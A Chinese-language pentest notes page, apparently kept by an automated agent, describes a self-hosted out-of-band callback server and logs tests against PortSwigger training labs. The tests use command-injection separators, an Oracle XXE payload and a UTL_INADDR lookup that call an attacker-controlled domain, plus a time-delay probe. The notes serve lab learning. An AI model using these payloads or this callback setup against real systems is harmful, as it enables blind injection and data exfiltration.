---
title: oob-callback-family
---
# oob-callback-family

自建 OOB 回调底座(pentest 平台 DNS 出站墙的回马面)与 lab 出站实测。

## 基建(47.131.34.33,ubuntu,ssh root 免密)

- **DNS**:`/home/ubuntu/prs-oob/dns_oob 53 47.131.34.33 /home/ubuntu/prs-oob/dns.log`
  (root nohup;`*.oob.dthack.io` 委派到此,通配解析;日志每行 JSON:ts/qname/qtype/src)。
- **HTTP**:python3 http.server `0.0.0.0:9999` → 每个 GET 追加路径到 `/tmp/oob-http.log`
  (只记 path,无方法/头)。**回调 URL 形态:`http://ns.oob.dthack.io:9999/<marker>`**(A 记录 47.131.34.33,公网递归可解)。
- **deaddrop**:同机 `mgmt=9099 fetch=80`(反向回调面,`deaddrop.log`);80 与 9999 是两个不同 listener,别混。
- 读日志(件外一条命令即可,约定):
  `sh_run -- ssh -o StrictHostKeyChecking=no ubuntu@47.131.34.33 'cat /tmp/oob-http.log'`
  再 `text_grep <marker>`。DNS 腿:`grep <marker> ~/prs-oob/dns.log`。
- **主机侧自测**应先绿:`lab_http get http://ns.oob.dthack.io:9999/<m>` → 日志出现 `/<m>`。

## lab 出站实测(重要边界)

- PortSwigger OS command injection 的 OOB 两题(feedback 表单 email/name/subject/message),
  b16 与 b18 共 **40+ 载荷**(字段×分隔符 `; || && | $() 反引号 换行`×(`+`,`%20`,`${IFS}`)×
  (HTTP:9999 / 直连 IP:9999 / DNS nslookup))**零 lab 源命中**;
  反馈提交恒 200 `{}`(命令异步、无回显),命令是否执行无法从响应/时延判别(实测
  `;sleep 5;` 不拖延响应)。
- 结论同 b16:**lab 侧出站到自建 OOB 域不可达**(PortSwigger 仅放行其官方 Collaborator)。
  自建 OOB 腿对**本机发起**通;对 lab 发起不通。故这类 OOB 判定题在自建回调下无解,
  除非平台放行 lab 出站或改用官方 Collaborator-不是注入面问题。
- 副产品:**输出重定向**技术可用于区分"注入未执行 vs 出站被挡"(把命令输出写进
  web 可读文件再取回);本次因未知 app docroot 未用它收口。

## 复核结论

- 题面**明写**:「our firewall blocks interactions between the labs and arbitrary external systems.
  To solve the lab, you must use Burp Collaborator's default public server.」(sql-injection/blind/lab-out-of-band-data-exfiltration)
- 实操:把 payload 直接写进 **jar 的 TrackingId**(避开 lab_http 的"双 Cookie 头"问题-用空 jar + `--header` 才保证发的是 payload),
  分别用 Oracle XXE(`EXTRACTVALUE(xmltype('…ENTITY % remote SYSTEM "http://<marker>.oob.dthack.io/")`)
  与 `UTL_INADDR.get_host_address('<marker>.oob.dthack.io')` 打 marker;`oob_poll poll` 两轮(45s/60s,`--source both`)**零命中**。
- 同时确认该 app **无同步信道**:`TrackingId=xyz'`(语法错) → 200 且与基线同长;
  `dbms_pipe.receive_message(('a'),5)` 时延载荷 → 1s 内 200(查询真异步,题面不矛盾)→ 只能走 OOB。
- 官方 Collaborator 公共服 `https://oastify.com/` 本机可直达(200,仅一句说明页,**无公开轮询 API**);
  `burpcollaborator.net` 从本机直接 TLS 失败(UnknownIssuer)。
- 结论:此类"必须用 Burp Collaborator"的题在本环境属**结构性不可解**,按纪律记 blocked(解除条件:一个可用的 Collaborator 客户端)。

## 实录溯源

- [[lab-blind-out-of-band]]、[[lab-blind-out-of-band-data-exfiltration]](自建 OOB 对 lab 侧不可达,属平台边界)

## 相关族

- 盲注入 oracle 信道见 [[blind-injection-family]];SSRF 盲面见 [[ssrf-family]]。
- 方法论:web-vuln-methods(seed 层,按名引用)。
